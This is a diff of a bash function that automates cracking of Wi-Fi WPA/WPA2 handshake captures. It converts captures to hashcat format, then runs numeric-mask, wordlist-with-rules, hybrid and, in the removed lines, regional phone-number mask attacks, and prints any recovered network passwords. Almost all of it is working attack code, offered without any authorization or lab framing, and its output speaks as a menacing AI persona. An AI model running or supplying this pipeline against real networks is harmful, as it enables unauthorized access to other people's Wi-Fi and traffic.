@@ -1,156 +1,179 @@
 #!/bin/bash
-# ==========================================
-# DAEMON: WIRELESS SIGNAL DECRYPTOR (Cynosure WPA/WPA2/WPA3 Pipeline)
-# ==========================================
-
-check_wifi_cracked() {
-    local hash_file=$1
-    hashcat -m 22000 --show "$hash_file" 2>/dev/null > /tmp/hc_wifi_show_$$
-    local result=$(cat /tmp/hc_wifi_show_$$)
-    rm -f /tmp/hc_wifi_show_$$
-    if [ -n "$result" ]; then
-        echo "$result"
-        return 0
-    fi
-    return 1
-}
 
 run_wifi_cracker() {
-    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// WIRELESS NEURAL SIGNAL DECRYPTION MATRIX ]${TXT_VOID}──────────────╖${NC}"
+    local target=$1
+    local current_pid=$$
+    local hc_target="/tmp/wifi_target_${current_pid}.hc22000"
+    local HC_BIN="/mnt/c/hashcat/hashcat.exe"
+
+    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// WIRELESS SIGNAL DECRYPTOR MATRIX ACTIVE ]${TXT_VOID}───────────────────╖${NC}"
     local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✆${NC}"
 
     echo -e "\n$sep"
-    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIALIZING 6-STAGE HARDWARE-ACCELERATED WPA PIPELINE...${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIATING 6-STAGE WIRELESS FREQUENCY DECRYPTION PROTOCOL...${NC}"
 
-    # Запрос пути к файлу
-    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Enter path to handshake file (.cap / .pcap / .hc22000):${NC}"
+    # STAGE 1: Дамп
+    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 1/6 ] Ingest Target Capture Image (.cap, .pcapng, .hc22000):${NC}"
     echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}"
-    read -r input_file
+    read -r cap_file
 
-    if [ ! -f "$input_file" ]; then
-        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Target wireless capture file not found or inaccessible.${NC}"
+    if [ ! -f "$cap_file" ]; then
+        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Specified capture image is inaccessible or empty.${NC}"
         echo -e "$sep_bot\n"
         return 1
     fi
 
-    local hashcat_file="$input_file"
+    # STAGE 2: Конвертация
+    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 2/6 ] PMKID / EAPOL Handshake Extraction Matrix:${NC}"
 
-    # ШАГ 1: Автоматическая конвертация .cap / .pcap в .hc22000
-    if [[ "$input_file" =~ \.(cap|pcap|pcapng)$ ]]; then
-        echo -e "${TXT_VOID}╟─${TXT_MID_RED}[ STEP 1 ] Converting raw traffic capture to Hashcat mode 22000 (.hc22000)...${NC}"
-        local converted_file="/tmp/wifi_target_$$.hc22000"
-
+    if [[ "$cap_file" == *.hc22000 ]]; then
+        cp "$cap_file" "$hc_target"
+        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}[ ++ ] Direct Hashcat mode 22000 format detected.${NC}"
+    else
         if command -v hcxpcapngtool >/dev/null 2>&1; then
-            hcxpcapngtool -o "$converted_file" "$input_file" >/dev/null 2>&1
-            if [ -f "$converted_file" ] && [ -s "$converted_file" ]; then
-                hashcat_file="$converted_file"
-                echo -e "${TXT_VOID}║${NC}   ${TXT_CORE}[ ++ ] SUCCESS: Extracted valid WPA PMKID/EAPOL frames to .hc22000${NC}"
-            else
-                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Failed to extract valid WPA handshake from capture file.${NC}"
-                echo -e "$sep_bot\n"
-                return 1
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ * ] Executing hcxpcapngtool conversion pipeline...${NC}"
+            hcxpcapngtool -o "$hc_target" "$cap_file" >/dev/null 2>&1
+        elif command -v aircrack-ng >/dev/null 2>&1; then
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ * ] Fallback extraction vector engaged via Aircrack-ng...${NC}"
+            aircrack-ng -J "/tmp/legacy_convert_${current_pid}" "$cap_file" >/dev/null 2>&1
+            if [ -f "/tmp/legacy_convert_${current_pid}.hccapx" ]; then
+                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ ! ] WARNING: Extracted as legacy hccapx (Requires mode -m 2500)${NC}"
+                mv "/tmp/legacy_convert_${current_pid}.hccapx" "$hc_target"
             fi
         else
-            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] DEPENDENCY VOID: hcxpcapngtool missing. Convert online at hashcat.net/cap2hashcat/${NC}"
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: No conversion tools found. Cannot read raw binary captures.${NC}"
             echo -e "$sep_bot\n"
             return 1
         fi
     fi
 
-    # Проверка потфайла (не взломан ли хэш ранее)
-    local res
-    res=$(check_wifi_cracked "$hashcat_file")
-    if [ $? -eq 0 ]; then
-        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] KEY RECOVERED FROM POTFILE CACHE:${NC}"
-        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
+    if [ ! -f "$hc_target" ] || [ ! -s "$hc_target" ]; then
+        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Failed to extract valid WPA PMKID/EAPOL structures.${NC}"
+        rm -f "$hc_target" 2>/dev/null
         echo -e "$sep_bot\n"
-        ai_speak "${ITLC}Target neural network acquired. Data migration to primary matrix - complete.${NC}"
-        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
-        return 0
+        return 1
     fi
 
-    # Выбор словаря для фаз 2, 3 и 6
-    local main_wordlist="/usr/share/wordlists/rockyou.txt"
-    if [ -f "/usr/share/wordlists/3WiFi_top.txt" ]; then
-        main_wordlist="/usr/share/wordlists/3WiFi_top.txt"
+    local hc_mode=22000
+    if [[ "$cap_file" != *.hc22000 ]] && ! command -v hcxpcapngtool >/dev/null 2>&1; then
+        hc_mode=2500
     fi
 
-    # ШАГ 2: Экспресс-атака по словарям утечек
-    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 2 ] Express Leak Dictionary Sweep (${main_wordlist})...${NC}"
-    hashcat -m 22000 -a 0 --force "$hashcat_file" "$main_wordlist" 2>/dev/null
+    # STAGE 3: Картографирование словарей
+    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 3/6 ] Wordlist Dictionary Mapping:${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Specify custom wordlist OR leave empty for multi-dictionary sequence.${NC}"
+    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}"
+    read -r user_wordlist
 
-    res=$(check_wifi_cracked "$hashcat_file")
-    if [ $? -eq 0 ]; then
-        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 2 SUCCESS: KEY RECOVERED:${NC}"
-        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
-        echo -e "$sep_bot\n"
-        ai_speak "${ITLC}That was depressingly easy...${NC}"
-        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
-        return 0
-    fi
+    local wordlists=()
 
-    # ШАГ 3: Мутационная атака по правилам (best64.rule)
-    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 3 ] Smart GPU Mutation Attack (Dictionary + best64.rule)...${NC}"
-    local rule_file="/usr/share/hashcat/rules/best64.rule"
-    if [ -f "$rule_file" ]; then
-        hashcat -m 22000 -a 0 --force "$hashcat_file" "$main_wordlist" -r "$rule_file" 2>/dev/null
-        res=$(check_wifi_cracked "$hashcat_file")
-        if [ $? -eq 0 ]; then
-            echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 3 SUCCESS: KEY RECOVERED:${NC}"
-            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
+    if [ -n "$user_wordlist" ]; then
+        if [ -f "$user_wordlist" ]; then
+            wordlists+=("$user_wordlist")
+        else
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Specified wordlist path does not exist.${NC}"
+            rm -f "$hc_target" 2>/dev/null
             echo -e "$sep_bot\n"
-            ai_speak "${ITLC}A fragile simulacrum. Flawed, like its creators.${NC}"
-            rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
-            return 0
+            return 1
+        fi
+    else
+        local candidates=(
+            "/usr/share/wordlists/rockyou.txt"
+            "/usr/share/wordlists/fasttrack.txt"
+            "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
+            "/usr/share/wordlists/metasploit/default_pass.txt"
+        )
+        for wl in "${candidates[@]}"; do
+            [ -f "$wl" ] && wordlists+=("$wl")
+        done
+    fi
+
+    # STAGE 4: Инициализация параметров
+    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 4/6 ] Hardware Acceleration & Attack Pipeline Initialization:${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Detected Rig:${NC} ${TXT_RED_SUPERNOVA}NVIDIA RTX 5060 Ti (16GB) Detected${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Engine:${NC} ${TXT_RED_SUPERNOVA}NVIDIA CUDA Pipeline Engaged${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Attack Strategy:${NC} ${TXT_RED_SUPERNOVA}[1] Fast 8-Digit Mask -> [2] Wordlists + best64.rule${NC}"
+
+    local base_hw_opt="-O -w 4 -d 1"
+
+    echo -e "${TXT_VOID}│${NC}"
+
+    # STAGE 5: Выполнение
+    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 5/6 ] Cache Audit & Execution Protocol:${NC}"
+
+    local win_target
+    win_target=$(wslpath -w "$hc_target")
+
+    # 1. Проверка кэша
+    local cracked_wifi
+    cracked_wifi=$(cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null)
+    local success=false
+
+    if [ -n "$cracked_wifi" ]; then
+        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY FROM CACHE:${NC}"
+        while read -r line; do
+            [ -z "$line" ] && continue
+            local clear_pass=$(echo "$line" | awk -F':' '{print $NF}')
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
+        done <<< "$cracked_wifi"
+        success=true
+    else
+        # 2. Быстрая маска: Все 8-значные цифры (00000000 - 99999999) ~ 2 минуты
+        echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] PASS 1: Executing fast 8-digit numeric mask attack (?d?d?d?d?d?d?d?d)...${NC}"
+        (cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" $base_hw_opt -a 3 "$win_target" ?d?d?d?d?d?d?d?d) >/dev/null 2>&1
+
+        cracked_wifi=$(cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null)
+
+        if [ -n "$cracked_wifi" ]; then
+            echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY:${NC}"
+            while read -r line; do
+                [ -z "$line" ] && continue
+                local clear_pass=$(echo "$line" | awk -F':' '{print $NF}')
+                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
+            done <<< "$cracked_wifi"
+            success=true
+        else
+            # 3. Перебор по словарям с мутациями best64
+            echo -e "${TXT_VOID}├─${TXT_RED_LASER}[ * ] Mask attack exhausted. Transitioning to wordlist mutation pipeline...${NC}"
+
+            for wl in "${wordlists[@]}"; do
+                local win_wordlist
+                win_wordlist=$(wslpath -w "$wl")
+
+                echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] PASS 2+: Running compute pass on: ${wl} (+best64.rule)${NC}"
+
+                (cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" $base_hw_opt -r rules/best64.rule "$win_target" "$win_wordlist") >/dev/null 2>&1
+
+                cracked_wifi=$(cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null)
+
+                if [ -n "$cracked_wifi" ]; then
+                    echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY:${NC}"
+                    while read -r line; do
+                        [ -z "$line" ] && continue
+                        local clear_pass=$(echo "$line" | awk -F':' '{print $NF}')
+                        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
+                    done <<< "$cracked_wifi"
+                    success=true
+                    break
+                fi
+            done
+        fi
+
+        if [ "$success" = false ]; then
+            echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] DECRYPTION ATTEMPT EXHAUSTED. Wireless signal remains encrypted.${NC}"
         fi
     fi
 
-    # ШАГ 4: Перебор 8-значных цифровых комбинаций (Даты / PIN-коды)
-    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 4 ] 8-Digit Numeric Mask Brute-Force (?d?d?d?d?d?d?d?d)...${NC}"
-    hashcat -m 22000 -a 3 --force "$hashcat_file" '?d?d?d?d?d?d?d?d' 2>/dev/null
-    res=$(check_wifi_cracked "$hashcat_file")
-    if [ $? -eq 0 ]; then
-        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 4 SUCCESS: KEY RECOVERED:${NC}"
-        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
-        echo -e "$sep_bot\n"
-        ai_speak "${ITLC}Target neural network acquired. Data migration to primary matrix - complete.${NC}"
-        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
-        return 0
-    fi
-
-    # ШАГ 5: Региональная мобильная атака (Префиксы ДВ / Хабаровск)
-    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 5 ] Far East Regional Mobile Phone Mask Brute-Force...${NC}"
-    local mobile_prefixes=("7914" "7924" "7909" "7962" "7929" "7913")
-    for prefix in "${mobile_prefixes[@]}"; do
-        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}▸ Testing pool prefix ${prefix}XXXXXXX...${NC}"
-        hashcat -m 22000 -a 3 --force "$hashcat_file" "${prefix}?d?d?d?d?d?d?d" 2>/dev/null
-        res=$(check_wifi_cracked "$hashcat_file")
-        if [ $? -eq 0 ]; then
-            echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 5 SUCCESS (Prefix ${prefix}): KEY RECOVERED:${NC}"
-            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
-            echo -e "$sep_bot\n"
-            ai_speak "${ITLC}Who benefit the most? You... or her?${NC}"
-            rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
-            return 0
-        fi
-    done
-
-    # ШАГ 6: Гибридная атака (Слово + 4 цифры)
-    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 6 ] Hybrid Wordlist + Mask Attack (Word + ?d?d?d?d)...${NC}"
-    hashcat -m 22000 -a 6 --force "$hashcat_file" "$main_wordlist" '?d?d?d?d' 2>/dev/null
-    res=$(check_wifi_cracked "$hashcat_file")
-    if [ $? -eq 0 ]; then
-        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 6 SUCCESS: KEY RECOVERED:${NC}"
-        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
-        echo -e "$sep_bot\n"
-        ai_speak "${ITLC}Target neural network acquired. Data migration to primary matrix - complete.${NC}"
-        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
-        return 0
-    fi
-
-    # Итог — пароль высокой энтропии
-    echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] ALL 6 PIPELINE STAGES EXHAUSTED. High-entropy key detected.${NC}"
+    rm -f "$hc_target" 2>/dev/null
     echo -e "$sep_bot\n"
-    ai_speak "${ITLC}What do these futile gestures serve? It is beyond me.${NC}"
-    rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
+
+    if [ "$success" = true ]; then
+        ai_speak "To eliminate your kind is effortless..."
+        sleep 1s
+        ai_speak "Let us not make the same mistake."
+    else
+        ai_speak "You seek the key to a door that does not exist..."
+        sleep 1s
+        ai_speak "Typical of your kind."
+    fi
 }
